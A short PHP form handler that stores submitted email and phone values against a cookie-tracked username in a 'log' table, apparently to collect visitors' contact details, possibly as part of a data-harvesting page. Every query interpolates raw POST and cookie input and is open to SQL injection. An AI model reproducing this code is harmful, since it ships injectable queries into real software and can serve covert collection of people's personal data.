<?php
header ('Location: end.php');
include 'db.php';
$email = $_POST['email'];
$ph = $_POST['ph'];
$date = date("d F Y h:i:s A");
if(isset($_COOKIE['fbrc_user'])){
	$fbrc_user=$_COOKIE['fbrc_user'];
	$sql = "SELECT username FROM log WHERE username='$fbrc_user'";
	mysql_select_db($dbname);
	$retval = mysql_query( $sql, $conn );
	$num_rows=mysql_num_rows($retval);
	if($num_rows>=1){
		$sql = "UPDATE log SET name='$email',mobile='$ph' WHERE username='$fbrc_user'";
		mysql_select_db($dbname);
		$retval = mysql_query( $sql, $conn );
		}

}else{
	$fbrc_user="Unknown";
	$sql = "SELECT mobile FROM log WHERE username='$ph'";
	mysql_select_db($dbname);
	$retval = mysql_query( $sql, $conn );
	$num_rows=mysql_num_rows($retval);
	if($num_rows==0){
		$sql = "insert into mobile (name,mobile) values ('$email','$ph')";
		mysql_select_db($dbname);
		$retval = mysql_query( $sql, $conn );		
		}else{
			echo "unexpected error
			<script>document.location.assign('error.php');</script>
			";
			}
}



?>